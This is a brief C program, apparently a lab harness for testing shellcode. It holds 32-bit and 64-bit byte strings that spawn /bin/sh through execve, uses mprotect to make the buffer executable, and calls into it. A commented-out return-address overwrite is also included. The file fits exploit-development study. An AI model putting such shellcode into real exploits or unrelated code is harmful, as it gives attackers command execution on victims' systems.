#include<stdio.h>
#include<stdint.h>
#include<sys/mman.h>

/*
 * For 32 bit
char shellcode[] = "\x31\xc0\x31\xf6\xb0\x0b\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xf1\x89\xf2\xcd\x80";
*/

/*
 * For 64 bit 
char shellcode[] = "\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x99\x52\x50\x54\x5f"
		   "\x52\x5e\x6a\x3b\x58\x0f\x05";
*/

char shellcode[] = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

void main(){
        /*
        int *ret;
        ret = (int *)&ret + 4;
        (*ret) = (int)shellcode;
        */
        mprotect((void *)((uintptr_t)shellcode & ~4095),
                        ((uintptr_t)shellcode & 4095) + sizeof(shellcode),
                        PROT_READ | PROT_WRITE | PROT_EXEC);

       ( *(void (*)()) shellcode)() ;

        printf("NO SHELL CREATION");
}
